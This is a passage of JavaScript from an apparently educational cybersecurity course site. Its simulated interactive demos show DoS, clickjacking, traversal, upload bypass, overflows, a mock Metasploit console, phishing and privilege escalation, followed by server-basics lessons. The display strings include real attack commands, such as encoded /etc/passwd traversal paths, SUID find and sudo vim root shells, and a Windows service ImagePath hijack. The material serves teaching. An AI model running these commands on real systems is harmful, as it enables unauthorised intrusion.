        layers.forEach(function(l){stack.innerHTML+='<div style="background:'+l.color+';color:white;padding:12px 16px;border-radius:4px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:transform 0.2s" class="osiLayer"><span><strong>Layer '+l.n+':</strong> '+l.name+'</span><span style="font-size:0.8rem;opacity:0.8">'+l.ex+'</span></div>';});
        $$('.osiLayer').forEach(function(l){ l.onmouseover=function(){l.style.transform='scale(1.03)';}; l.onmouseout=function(){l.style.transform='scale(1)';}; });
    }

    function demoDoS(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK SIMULATION</span><span class="demo-title">DoS Attack Visualization</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn" id="dosNormal">Normal Traffic</button><button class="demo-btn" style="background:var(--danger);color:white" id="dosAttack">Launch DDoS</button><button class="demo-btn demo-btn-sm" id="dosStop">Stop</button></div><div style="display:flex;gap:16px;align-items:center;justify-content:center"><div style="text-align:center"><div style="font-size:0.8rem;color:var(--text-muted)">Server Load</div><div style="width:200px;height:24px;background:#edf2f7;border-radius:12px;overflow:hidden"><div id="dosFill" style="height:100%;width:10%;background:var(--success);transition:all 0.3s;border-radius:12px"></div></div><div id="dosStatus" style="font-size:0.85rem;margin-top:4px">Online</div></div><div id="dosReqCount" style="font-size:1.5rem;font-weight:bold;font-family:var(--font-mono)">0</div><div style="font-size:0.8rem;color:var(--text-muted)">req/s</div></div></div></div>';
        var iv,load=10;
        function setLoad(l){load=Math.min(100,Math.max(0,l));$('#dosFill').style.width=load+'%';$('#dosFill').style.background=load>80?'var(--danger)':load>50?'var(--warning)':'var(--success)';$('#dosStatus').textContent=load>90?'DOWN!':load>80?'Degraded':'Online';}
        $('#dosNormal').onclick=function(){clearInterval(iv);iv=setInterval(function(){load=10+Math.random()*20;setLoad(load);$('#dosReqCount').textContent=Math.floor(50+Math.random()*50);},500);};
        $('#dosAttack').onclick=function(){clearInterval(iv);var t=0;iv=setInterval(function(){t++;load=Math.min(100,20+t*5);setLoad(load);$('#dosReqCount').textContent=Math.floor(1000+t*500);},200);};
        $('#dosStop').onclick=function(){clearInterval(iv);setLoad(10);$('#dosReqCount').textContent='0';};
    }

    /* ============================================================
       C6 NEW DEMOS
       ============================================================ */
    function demoSessionGuessing(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">VULNERABLE</span><span class="demo-title">Session ID Guessing</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center" id="sessBtns"><button class="demo-btn active" data-s="seq">Sequential IDs</button><button class="demo-btn" data-s="rand">Secure Random IDs</button></div><div style="display:flex;gap:16px;flex-wrap:wrap"><div style="flex:1;min-width:200px"><div style="font-weight:bold;font-size:0.85rem;margin-bottom:8px">Active Sessions:</div><div id="sessList" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.8rem;padding:12px;border-radius:8px"></div></div><div style="flex:1;min-width:200px"><div style="font-weight:bold;font-size:0.85rem;margin-bottom:8px">Brute Force:</div><button class="demo-btn demo-btn-sm" id="sessAttack">Try Next ID</button><div id="sessResult" style="margin-top:8px;font-size:0.85rem"></div></div></div></div></div>';
        var mode='seq',attempt=1005;
        function renderSessions(){
            var ids=mode==='seq'?[1001,1002,1003,1004]:['a8f2c9d1e4b7','c3d5e7f9a1b2','e6f8a0b2c4d6','f1a3b5c7d9e0'];
            $('#sessList').textContent=ids.map(function(id,i){return 'Session '+(i+1)+': '+id;}).join('\n');
        }
        renderSessions();
        $$('#sessBtns .demo-btn').forEach(function(b){if(b.dataset.s)b.onclick=function(){$$('#sessBtns .demo-btn').forEach(function(x){if(x.dataset.s)x.classList.remove('active');});b.classList.add('active');mode=b.dataset.s;attempt=1005;renderSessions();$('#sessResult').innerHTML='';};});
        $('#sessAttack').onclick=function(){
            if(mode==='seq'){$('#sessResult').innerHTML='<div style="color:var(--success)">Trying: '+attempt+' - ACCESS GRANTED!</div>';attempt++;}
            else{var rand=Math.random().toString(36).substring(2,14);$('#sessResult').innerHTML='<div style="color:var(--danger)">Trying: '+rand+' - FAILED. Too many combinations!</div>';}
        };
    }

    function demoClickjack(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK</span><span class="demo-title">Clickjacking Attack</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="position:relative;height:200px;border:2px solid var(--border);border-radius:8px;overflow:hidden"><div style="position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;background:var(--bg-secondary);z-index:0"><div style="font-size:1.5rem">Prize!</div><div style="font-weight:bold;margin:8px 0">You won a free iPhone!</div><button id="cjPrize" class="demo-btn" style="font-size:1.1rem;padding:12px 24px">Click to claim!</button></div><div id="cjOverlay" style="position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;opacity:0;z-index:1;background:white;pointer-events:none"><div style="color:#333;font-weight:bold">BigBank.com</div><div style="margin:8px 0;color:#333;font-size:0.85rem">Transfer $10,000 to account 1337?</div><button style="background:#e74c3c;color:white;border:none;padding:12px 24px;border-radius:8px;font-size:1.1rem">Confirm Transfer</button></div></div><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn demo-btn-sm" id="cjShow">Show Hidden Layer</button><button class="demo-btn demo-btn-sm" id="cjHide">Hide</button></div><div id="cjMsg" style="text-align:center;font-size:0.85rem;color:var(--text-muted)">Click the "prize" button to see what happens...</div></div></div>';
        $('#cjPrize').onclick=function(){$('#cjMsg').innerHTML='<span style="color:var(--danger)">You just confirmed a $10,000 bank transfer! The prize button was overlaid on a hidden bank page.</span>';};
        $('#cjShow').onclick=function(){$('#cjOverlay').style.opacity='0.5';$('#cjOverlay').style.pointerEvents='auto';};
        $('#cjHide').onclick=function(){$('#cjOverlay').style.opacity='0';$('#cjOverlay').style.pointerEvents='none';};
    }

    function demoDirTraversal(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">VULNERABLE</span><span class="demo-title">Directory Traversal Encodings</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dtBtns"><button class="demo-btn demo-btn-sm active" data-e="plain">Plain ../</button><button class="demo-btn demo-btn-sm" data-e="url">URL Encoded</button><button class="demo-btn demo-btn-sm" data-e="double">Double Encoded</button></div><div style="background:var(--bg-secondary);padding:16px;border-radius:8px"><div style="font-size:0.8rem;color:var(--text-muted)">Request Path:</div><div id="dtPath" style="font-family:var(--font-mono);font-size:0.9rem;word-break:break-all;margin:8px 0"></div><div id="dtResult" style="font-size:0.85rem;margin-top:8px"></div></div></div></div>';
        var enc={plain:{path:'../../../../etc/passwd',desc:'Standard traversal - easily caught by basic filters'},url:{path:'%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',desc:'URL encoding bypasses simple string filters'},double:{path:'%252e%252e%252f%252e%252e%252fetc%252fpasswd',desc:'Double encoding - decoded twice: %252e -> %2e -> .'}};
        $$('#dtBtns .demo-btn').forEach(function(b){if(b.dataset.e)b.onclick=function(){$$('#dtBtns .demo-btn').forEach(function(x){if(x.dataset.e)x.classList.remove('active');});b.classList.add('active');var e=enc[b.dataset.e];$('#dtPath').textContent=e.path;$('#dtResult').innerHTML='<span style="color:var(--danger)">'+e.desc+'</span>';};});
        $('#dtPath').textContent=enc.plain.path;$('#dtResult').innerHTML='<span style="color:var(--danger)">'+enc.plain.desc+'</span>';
    }

    function demoFileUpload(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">VULNERABLE</span><span class="demo-title">File Upload Bypass</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="upBtns"><button class="demo-btn demo-btn-sm" data-u="safe">photo.jpg</button><button class="demo-btn demo-btn-sm" data-u="double">shell.php.jpg</button><button class="demo-btn demo-btn-sm" data-u="mime">shell.php (MIME spoofed)</button><button class="demo-btn demo-btn-sm" data-u="null">shell.php%00.jpg</button></div><div id="uploadResult" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-size:0.85rem;text-align:center;min-height:60px"></div></div></div>';
        var results={safe:'Upload accepted: photo.jpg stored safely as image',double:'shell.php.jpg uploaded! Apache may execute this as PHP if misconfigured.',mime:'MIME type set to image/jpeg but file is PHP! Web shell uploaded!',null:'Null byte injection: shell.php\\x00.jpg - saved as shell.php!'};
        $$('#upBtns .demo-btn').forEach(function(b){if(b.dataset.u)b.onclick=function(){$('#uploadResult').innerHTML=results[b.dataset.u];};});
    }

    function demoBOF(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK</span><span class="demo-title">Buffer Overflow Visualizer</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center"><span style="font-size:0.85rem">Input size:</span><input id="bofSize" type="range" min="10" max="120" value="10" style="flex:1;max-width:200px"><span id="bofSizeVal" style="font-family:var(--font-mono)">10</span></div><div id="bofMem" style="display:flex;gap:2px;flex-wrap:wrap;justify-content:center"></div><div id="bofStatus" style="text-align:center;font-size:0.85rem;padding:8px;border-radius:8px"></div></div></div>';
        function render(){
            var size=+$('#bofSize').value;$('#bofSizeVal').textContent=size;
            var mem=$('#bofMem');mem.innerHTML='';
            for(var i=0;i<100;i++){
                var filled=i<size;
                var color='#edf2f7';
                if(filled&&i<80) color='#3498db';
                else if(filled&&i>=80&&i<84) color='#e67e22';
                else if(filled&&i>=84&&i<88) color='#e74c3c';
                else if(filled&&i>=88) color='#c0392b';
                else if(!filled&&i>=80&&i<84) color='#ffeaa7';
                else if(!filled&&i>=84&&i<88) color='#fab1a0';
                mem.innerHTML+='<div style="width:8px;height:20px;background:'+color+';border-radius:2px"></div>';
            }
            var status=$('#bofStatus');
            if(size<=80) status.innerHTML='<span style="color:var(--success)">Safe - input fits within buffer</span>';
            else if(size<=84) status.innerHTML='<span style="color:var(--warning)">Overwriting saved EBP!</span>';
            else if(size<=88) status.innerHTML='<span style="color:var(--danger)">OVERWRITING RETURN ADDRESS (EIP)! Attacker controls execution!</span>';
            else status.innerHTML='<span style="color:var(--danger)">NOP sled + shellcode injected!</span>';
        }
        $('#bofSize').oninput=render;render();
    }

    function demoIntOverflow(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">VULNERABILITY</span><span class="demo-title">Integer Overflow</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center" id="intBtns"><button class="demo-btn active" data-t="unsigned">Unsigned 8-bit</button><button class="demo-btn" data-t="signed">Signed 8-bit</button></div><div style="display:flex;gap:8px;align-items:center;justify-content:center"><button class="demo-btn demo-btn-sm" id="intDec">-1</button><span id="intVal" style="font-family:var(--font-mono);font-size:2rem;font-weight:bold;min-width:60px;text-align:center">127</span><button class="demo-btn demo-btn-sm" id="intInc">+1</button></div><div id="intBin" style="font-family:var(--font-mono);text-align:center;font-size:1.2rem"></div><div id="intMsg" style="text-align:center;font-size:0.85rem;color:var(--text-muted)"></div></div></div>';
        var val=127,signed=false;
        function render(){
            var display=signed?(val>127?val-256:val):val;
            $('#intVal').textContent=display;
            var bin=(val&0xFF).toString(2).padStart(8,'0');
            $('#intBin').textContent=bin;
            if(val===0&&!signed) $('#intMsg').innerHTML='<span style="color:var(--danger)">Unsigned underflow! 0-1 wrapped to 255</span>';
            else if(val===255&&!signed) $('#intMsg').innerHTML='<span style="color:var(--danger)">Unsigned overflow! 255+1 will wrap to 0</span>';
            else if(val===128&&signed) $('#intMsg').innerHTML='<span style="color:var(--danger)">Signed overflow! 127+1 = -128</span>';
            else $('#intMsg').textContent='';
        }
        $$('#intBtns .demo-btn').forEach(function(b){if(b.dataset.t)b.onclick=function(){$$('#intBtns .demo-btn').forEach(function(x){if(x.dataset.t)x.classList.remove('active');});b.classList.add('active');signed=b.dataset.t==='signed';render();};});
        $('#intInc').onclick=function(){val=(val+1)&0xFF;render();};
        $('#intDec').onclick=function(){val=(val-1)&0xFF;render();};
        render();
    }

    function demoMetasploit(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXPLOIT</span><span class="demo-title">Metasploit Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:0"><div style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px 8px 0 0;min-height:200px;max-height:300px;overflow-y:auto" id="msfOut"></div><div style="display:flex;background:#1a1a2e;padding:4px 16px;border-radius:0 0 8px 8px"><span style="color:#ff0000;font-family:var(--font-mono);font-size:0.78rem">msf6 > </span><input id="msfIn" style="flex:1;background:transparent;border:none;color:#00ff41;font-family:var(--font-mono);font-size:0.78rem;outline:none"></div></div></div>';
        var cmds={help:'Core Commands\n  search  Search for exploits\n  use     Select a module\n  set     Set option\n  options Show options\n  exploit Launch exploit',search:'Matching Modules\n  exploit/windows/smb/ms08_067  great  MS08-067\n  exploit/windows/smb/ms17_010  great  EternalBlue','use':'[*] Module selected',options:'  RHOSTS    (required)  Target address\n  RPORT    445          SMB port\n  LHOST    (required)  Listen address',exploit:'[*] Started reverse TCP handler on 192.168.1.50:4444\n[*] Sending stage to target...\n[*] Meterpreter session 1 opened\n\nmeterpreter > '};
        var out=$('#msfOut');
        out.innerHTML='<div style="color:#ff0000">  METASPLOIT v6.3.0\n  2200 exploits - 1100 payloads\n</div>';
        $('#msfIn').onkeydown=function(e){
            if(e.key!=='Enter')return;var cmd=$('#msfIn').value.trim();$('#msfIn').value='';if(!cmd)return;
            out.innerHTML+='<div style="color:#ccc">msf6 > '+esc(cmd)+'</div>';
            var match=Object.keys(cmds).find(function(k){return cmd.indexOf(k)>=0;});
            out.innerHTML+='<div>'+(match?cmds[match]:'Unknown command: '+esc(cmd)+'. Try: help')+'</div>';
            out.scrollTop=out.scrollHeight;
        };
    }

    function demoPhishing(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK</span><span class="demo-title">Spot the Phishing Email</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="background:white;color:#333;padding:16px;border-radius:8px;border:1px solid #ddd"><div style="display:flex;justify-content:space-between;border-bottom:1px solid #eee;padding-bottom:8px;margin-bottom:8px;font-size:0.85rem"><div><strong>From:</strong> security@amaz0n-support.com</div><div style="color:#999">Today 9:41 AM</div></div><div style="font-weight:bold;margin-bottom:8px;font-size:0.95rem">Urgent: Your account has been compromised!</div><div style="font-size:0.85rem;line-height:1.6"><p>Dear Valued Customer,</p><p>We detected suspicious activity. Click below to verify or your account will be suspended in 24 hours.</p><p><a href="#" style="color:#0066cc" id="phishLink">https://amazon.com/verify-account</a></p></div></div><button class="demo-btn" id="phishReveal">Reveal Red Flags</button><div id="phishFlags" style="display:none;font-size:0.85rem;line-height:1.8"></div></div></div>';
        $('#phishLink').onclick=function(e){e.preventDefault();alert('This link goes to: http'+'://amaz0n-phish.evil.com/steal-creds');};
        $('#phishReveal').onclick=function(){$('#phishFlags').style.display='block';$('#phishFlags').innerHTML='<div style="color:var(--danger)">Red Flags:</div><ul><li>Sender: amaz0n (zero not O)</li><li>Creates urgency: 24 hours</li><li>Generic greeting</li><li>Link text differs from actual URL</li><li>Asks to click link instead of logging in directly</li></ul>';};
    }

    function demoPrivEsc(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK</span><span class="demo-title">Privilege Escalation Path</span></div><div class="demo-visual" style="flex-direction:column;gap:8px"><div style="display:flex;gap:4px;flex-direction:column;align-items:center"><div style="background:var(--accent);color:white;padding:12px 24px;border-radius:8px;text-align:center;width:80%;font-size:0.85rem;font-family:var(--font-mono)">1. Initial Access: www-data</div><div style="font-size:1.2rem">v</div><div style="background:var(--bg-secondary);padding:12px 24px;border-radius:8px;text-align:center;width:80%;font-size:0.85rem;font-family:var(--font-mono)">2. Find SUID: find / -perm -4000</div><div style="font-size:1.2rem">v</div><div style="background:var(--bg-secondary);padding:12px 24px;border-radius:8px;text-align:center;width:80%;font-size:0.85rem;font-family:var(--font-mono)">3. Exploit: /usr/bin/find -exec /bin/sh \\;</div><div style="font-size:1.2rem">v</div><div style="background:var(--danger);color:white;padding:12px 24px;border-radius:8px;text-align:center;width:80%;font-size:0.85rem;font-family:var(--font-mono)">4. Root Shell: uid=0(root)</div></div></div></div>';
    }

    function demoSUID(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">INTERACTIVE</span><span class="demo-title">SUID Exploitation</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;white-space:pre-line" id="suidOut">www-data@target:~$ Click a button to run a command</div><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="suidBtns"><button class="demo-btn demo-btn-sm" data-c="find">find SUID files</button><button class="demo-btn demo-btn-sm" data-c="exploit">Exploit find</button><button class="demo-btn demo-btn-sm" data-c="sudo">Check sudo -l</button><button class="demo-btn demo-btn-sm" data-c="sudoexploit">Exploit sudo</button></div></div></div>';
        var cmds={find:'$ find / -perm -4000 -type f 2>/dev/null\n\n-rwsr-xr-x 1 root root  /usr/bin/find\n-rwsr-xr-x 1 root root  /usr/bin/passwd\n-rwsr-xr-x 1 root root  /usr/bin/su\n\n/usr/bin/find has SUID bit set!',exploit:'$ /usr/bin/find /etc -exec /bin/sh -p \\;\n\n# whoami\nroot\n# id\nuid=33(www-data) euid=0(root)\n\nROOT ACCESS via SUID find!',sudo:'$ sudo -l\n\nUser www-data may run:\n    (root) NOPASSWD: /usr/bin/vim\n    (root) NOPASSWD: /usr/bin/less\n\nvim and less can spawn shells!',sudoexploit:'$ sudo vim -c ":!bash"\n\nroot@target:~# whoami\nroot\n\nROOT ACCESS via sudo vim!'};
        $$('#suidBtns .demo-btn').forEach(function(b){if(b.dataset.c)b.onclick=function(){$('#suidOut').textContent=cmds[b.dataset.c];};});
    }

    function demoWinPrivEsc(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">INTERACTIVE</span><span class="demo-title">Windows Privilege Escalation</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="winBtns"><button class="demo-btn demo-btn-sm active" data-w="unquoted">Unquoted Paths</button><button class="demo-btn demo-btn-sm" data-w="stored">Stored Creds</button><button class="demo-btn demo-btn-sm" data-w="registry">Registry</button></div><div id="winOut" style="background:#0c0c0c;color:#c0c0c0;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:150px;white-space:pre-line"></div></div></div>';
        var data={unquoted:'C:\\> wmic service get name,pathname |findstr /i "Auto"\n\nVulnSvc  C:\\Program Files\\Vuln Service\\service.exe\n\nWindows tries:\n  1. C:\\Program.exe\n  2. C:\\Program Files\\Vuln.exe\n  3. C:\\Program Files\\Vuln Service\\service.exe\n\nPlace malicious Vuln.exe in C:\\Program Files\\',stored:'C:\\> type C:\\unattend.xml\n\n<AutoLogon>\n  <Password>\n    <Value>UABhAHMAcwB3AG8AcgBkADEAMgAzAA==</Value>\n  </Password>\n  <Username>Administrator</Username>\n</AutoLogon>\n\n$ echo "UABhA..." | base64 -d\nPassword123\n\nAdministrator password recovered!',registry:'C:\\> reg query HKLM\\...\\Services\\VulnSvc /display\n\n  Everyone  Full Control\n\nAny user can modify the service!\n\nC:\\> reg add ... /v ImagePath /d C:\\evil.exe\n-> SYSTEM shell!'};
        $$('#winBtns .demo-btn').forEach(function(b){if(b.dataset.w)b.onclick=function(){$$('#winBtns .demo-btn').forEach(function(x){if(x.dataset.w)x.classList.remove('active');});b.classList.add('active');$('#winOut').textContent=data[b.dataset.w];};});
        $('#winOut').textContent=data.unquoted;
    }

    /* ============================================================
       C7: SERVERS & SERVICES DEMOS - UNIQUE PER LESSON
       ============================================================ */
    
    // C7L1: Intro to Servers
    function demoIntroToServers(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INFO</span><span class="demo-title">Introduction to Servers</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="intro1Btns">
                <button class="demo-btn demo-btn-sm active" data-s="what">What is a Server?</button>
                <button class="demo-btn demo-btn-sm" data-s="client">Client-Server Model</button>
                <button class="demo-btn demo-btn-sm" data-s="roles">Server Roles</button>
            </div>
            <div id="intro1Out" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.8rem;padding:20px;border-radius:8px;min-height:200px;white-space:pre-line"></div>
        </div></div>`;
        const data = {
            what: '🖥️ WHAT IS A SERVER?\n\nA server is a computer designed to:\n  • Provide services to other computers\n  • Run 24/7 without interruption\n  • Handle multiple simultaneous requests\n  • Store and manage shared resources\n\nExamples you use daily:\n  • Google.com → Web servers\n  • Gmail → Email servers\n  • Netflix → Streaming servers\n  • Online games → Game servers',
            client: '┌─────────────────────────────────────┐\n│      CLIENT-SERVER MODEL            │\n├─────────────────────────────────────┤\n│                                     │\n│  ┌────────┐     REQUEST     ┌──────┐│\n│  │ CLIENT │ ───────────────▶│SERVER││\n│  │(Browser│                 │      ││\n│  │ Phone) │ ◀───────────────│(Data ││\n│  └────────┘     RESPONSE    │Center││\n│                             └──────┘│\n└─────────────────────────────────────┘\n\n1. Client sends REQUEST (e.g., "Give me page")\n2. Server PROCESSES the request\n3. Server sends RESPONSE back',
            roles: 'SERVER ROLES IN ORGANIZATIONS:\n\n🏢 Small Business:\n  • 1-2 servers (file sharing, email)\n\n🏛️ Medium Enterprise:\n  • 10-50 servers (web, database, apps)\n\n🌐 Large Corporation:\n  • 1000+ servers (everything!)\n\n☁️ Cloud Providers (AWS, Azure):\n  • MILLIONS of servers worldwide!\n\nKey Point: Servers = Infrastructure backbone'
        };
        $('#intro1Out').textContent = data.what;
        $$('#intro1Btns .demo-btn').forEach(b => {
            if(b.dataset.s) b.onclick = () => {
                $$('#intro1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#intro1Out').textContent = data[b.dataset.s];
            };
        });
    }

    // C7L2: Server Hardware
    function demoServerHardware(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">HARDWARE</span><span class="demo-title">Server Hardware Components</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="hw1Btns">
                <button class="demo-btn demo-btn-sm active" data-h="chassis">Chassis Types</button>
                <button class="demo-btn demo-btn-sm" data-h="cpu">Server CPUs</button>
                <button class="demo-btn demo-btn-sm" data-h="memory">ECC Memory</button>
                <button class="demo-btn demo-btn-sm" data-h="storage">Storage</button>
            </div>
            <div id="hw1Out" style="background:#0d1117;color:#58a6ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            chassis: 'SERVER CHASSIS TYPES:\n\n┌─────────────────────────────────────┐\n│ 1U Rack Server (1.75" height)       │\n│ ▪ Compact, high density             │\n│ ▪ Limited expansion                 │\n├─────────────────────────────────────┤\n│ 2U Rack Server (3.5" height)        │\n│ ▪ More drive bays                   │\n│ ▪ Better cooling                    │\n├─────────────────────────────────────┤\n│ 4U Rack Server (7" height)          │\n│ ▪ Maximum expansion                 │\n│ ▪ GPU/accelerator cards             │\n├─────────────────────────────────────┤\n│ Tower Server                         │\n│ ▪ Standalone unit                   │\n│ ▪ Small office use                  │\n├─────────────────────────────────────┤\n│ Blade Server                         │\n│ ▪ Highest density                   │\n│ ▪ Shared power/cooling              │\n└─────────────────────────────────────┘',
            cpu: 'SERVER-GRADE CPUs:\n\n🔵 Intel Xeon:\n   • Scalable processors (Bronze/Silver/Gold/Platinum)\n   • Up to 56 cores per socket\n   • Multi-socket support (2-8 CPUs)\n   • Large cache (100MB+)\n\n🔴 AMD EPYC:\n   • Up to 128 cores per socket\n   • More PCIe lanes\n   • Better value/performance\n   • Strong in cloud workloads\n\nKey Differences vs Desktop:\n   ✓ ECC memory support\n   ✓ Higher core counts\n   ✓ Multi-socket capable\n   ✓ Better RAS features\n   ✓ Longer lifecycles',
            memory: 'ECC MEMORY (Error Correcting Code):\n\n┌───────────────────────────────────────┐\n│ Standard RAM:                         │\n│   Bit flip → Data corruption → Crash  │\n├───────────────────────────────────────┤\n│ ECC RAM:                              │\n│   Bit flip → Detected → Corrected ✓   │\n└───────────────────────────────────────┘\n\nHow it works:\n  • Extra bits store parity/checksum\n  • Single-bit errors auto-corrected\n  • Multi-bit errors detected (halt)\n\nServer Memory Types:\n  • DDR4/DDR5 ECC RDIMM\n  • LRDIMM (Load-Reduced)\n  • Persistent Memory (Intel Optane)',
            storage: 'SERVER STORAGE OPTIONS:\n\n💾 SAS Drives (Serial Attached SCSI):\n   • Enterprise HDDs\n   • 10K-15K RPM\n   • Dual-port for redundancy\n\n⚡ NVMe SSDs:\n   • Direct PCIe connection\n   • 3-7 GB/s throughput\n   • Low latency (<100μs)\n\n🗃️ Drive Configurations:\n   • Hot-swap bays (no downtime)\n   • RAID controllers\n   • Hardware encryption\n\n☁️ Network Storage:\n   • SAN (Storage Area Network)\n   • NAS (Network Attached Storage)\n   • iSCSI, Fibre Channel'
        };
        $('#hw1Out').textContent = data.chassis;
        $$('#hw1Btns .demo-btn').forEach(b => {
            if(b.dataset.h) b.onclick = () => {
                $$('#hw1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#hw1Out').textContent = data[b.dataset.h];
            };
        });
    }

    // C7L3: Server Software
    function demoServerSoftware(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">SOFTWARE</span><span class="demo-title">Server Operating Systems & Software</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="sw1Btns">
                <button class="demo-btn demo-btn-sm active" data-w="os">Server OS</button>
                <button class="demo-btn demo-btn-sm" data-w="linux">Linux Servers</button>
                <button class="demo-btn demo-btn-sm" data-w="windows">Windows Server</button>
                <button class="demo-btn demo-btn-sm" data-w="services">Services</button>
            </div>
            <div id="sw1Out" style="background:#1e1e1e;color:#4ec9b0;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            os: 'SERVER OPERATING SYSTEMS:\n\n┌──────────────┬───────────────────────┐\n│ OS           │ Market Share          │\n├──────────────┼───────────────────────┤\n│ Linux        │ ~75% (web servers)    │\n│ Windows      │ ~20% (enterprise)     │\n│ Unix (AIX)   │ ~3% (legacy)          │\n│ BSD          │ ~2% (specialized)     │\n└──────────────┴───────────────────────┘\n\nWhy Linux dominates:\n  ✓ Free and open source\n  ✓ Stable and secure\n  ✓ Low resource usage\n  ✓ Excellent CLI management\n  ✓ Container-friendly',
            linux: 'LINUX SERVER DISTRIBUTIONS:\n\n🎩 Red Hat Enterprise Linux (RHEL):\n   • Enterprise support\n   • 10-year lifecycle\n   • CentOS Stream (free rebuild)\n\n🟠 Ubuntu Server:\n   • Beginner-friendly\n   • 5-year LTS support\n   • Popular for cloud\n\n🦎 SUSE Linux Enterprise:\n   • SAP certified\n   • Enterprise focus\n\n🐧 Debian:\n   • Stability focus\n   • Long-term support\n   • Base for Ubuntu\n\n$ cat /etc/os-release   # Check distro',
            windows: 'WINDOWS SERVER:\n\nEditions:\n  • Standard - Basic server features\n  • Datacenter - Unlimited VMs\n  • Essentials - Small business (25 users)\n\nKey Features:\n  ✓ Active Directory (AD)\n  ✓ Group Policy (GPO)\n  ✓ Hyper-V virtualization\n  ✓ IIS web server\n  ✓ PowerShell automation\n\nUse Cases:\n  • Microsoft ecosystem\n  • .NET applications\n  • Exchange/SharePoint\n  • SQL Server\n\nLicensing: Per-core model ($$$)',
            services: 'COMMON SERVER SERVICES:\n\n🌐 Web: Apache, Nginx, IIS\n   Port: 80 (HTTP), 443 (HTTPS)\n\n🗄️ Database: MySQL, PostgreSQL, SQL Server\n   Port: 3306, 5432, 1433\n\n📧 Email: Postfix, Exchange, Sendmail\n   Port: 25, 587, 993\n\n📁 File: Samba, NFS, FTP\n   Port: 445, 2049, 21\n\n🔐 Auth: LDAP, Kerberos, RADIUS\n   Port: 389, 88, 1812\n\n📊 Monitoring: Nagios, Zabbix, Prometheus\n   Port: varies'
        };
        $('#sw1Out').textContent = data.os;
        $$('#sw1Btns .demo-btn').forEach(b => {
            if(b.dataset.w) b.onclick = () => {
                $$('#sw1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#sw1Out').textContent = data[b.dataset.w];
            };
        });
    }

    // C7L4: Types of Servers
    function demoTypesOfServers(pane) {
